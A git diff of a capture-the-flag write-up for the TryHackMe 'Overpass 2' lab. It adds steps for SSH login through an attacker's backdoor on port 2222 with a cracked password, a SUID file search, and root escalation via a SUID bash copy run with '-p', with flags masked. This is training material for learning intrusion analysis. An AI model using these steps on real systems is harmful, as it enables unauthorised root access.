@@ -61,9 +61,33 @@ hashcat -m 1710 "6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a
 
 1. Start Machine to get IP.
 2. Question `The attacker defaced the website. What message did they leave as a heading?` Answer `H4ck3d by CooctusClan`. Manually checking strings output for downloading deface page will show this. We can also use this command `strings overpass2.pcapng |grep "H4ck3d"`. Or simply opening the ip in browser will show this heading.
-3. We have repeat attackers steps. 
-4. Now we can login to the ssh port 2222 opened by the backdoor as we saw in `strings` output. We already have username `james` and can use cracked password.
-5. 
-6. 
+3. We have repeat attackers steps. Now we can login to the ssh port 2222 opened by the backdoor as we saw in `strings` output. We already have username `james` and can use cracked password.
+```bash
+ssh -p 2222 james@10.10.136.126
+Unable to negotiate with 10.10.136.126 port 2222: no matching host key type found. Their offer: ssh-rsa
+$ ssh -oHostKeyAlgorithms=+ssh-rsa james@10.10.136.126 -p 2222
+The authenticity of host '[10.10.136.126]:2222 ([10.10.136.126]:2222)' can't be established.
+RSA key fingerprint is SHA256:z0OyQNW5sa3rr6mR7yDMo1avzRRPcapaYwOxjttuZ58.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.10.136.126]:2222' (RSA) to the list of known hosts.
+james@10.10.136.126's password: *******
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+```
+4. Question `What's the user flag?` Answer `thm{****************}`
+```bash
+james@overpass-production:/home/james/ssh-backdoor$ cat /home/james/user.txt
+thm{****************}
+```
+5. By using SUID find command `find . -perm /4000` we got a unusual file `/home/james/.suid_bash`. We can get suid exploit for it here https://gtfobins.github.io/gtfobins/bash/#suid
+6. Question `What's the root flag?` Answer `thm{***************************}`
+```bash
+james@overpass-production:/home/james/ssh-backdoor$ /home/james/.suid_bash -p
+.suid_bash-4.4# id
+uid=1000(james) gid=1000(james) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),1000(james)
+.suid_bash-4.4# cat /root/root.txt 
+thm{***************************}
+```
 
 Author: Zishan Ahamed Thandar
